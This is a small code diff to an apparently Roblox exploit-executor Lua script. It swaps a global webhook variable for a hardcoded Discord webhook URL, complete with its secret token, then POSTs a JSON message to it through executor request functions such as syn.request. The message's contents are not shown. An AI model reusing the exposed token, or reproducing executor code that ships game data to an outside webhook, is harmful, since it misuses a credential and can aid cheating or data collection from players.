@@ -85,7 +85,7 @@ local msg = {
   },
 	["attachments"] = {}
   }
-  local Webhook = _G.Webhook
+  local Webhook = "https://discord.com/api/webhooks/1117121047985131621/9b7Gy-8IOUy7_7zroEtKGzPm0rz4XLRumUA-pjvN-bR08vVAM5CGcD9ZH6njqMn8tMiW"
   request = http_request or request or HttpPost or syn.request
   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
   end
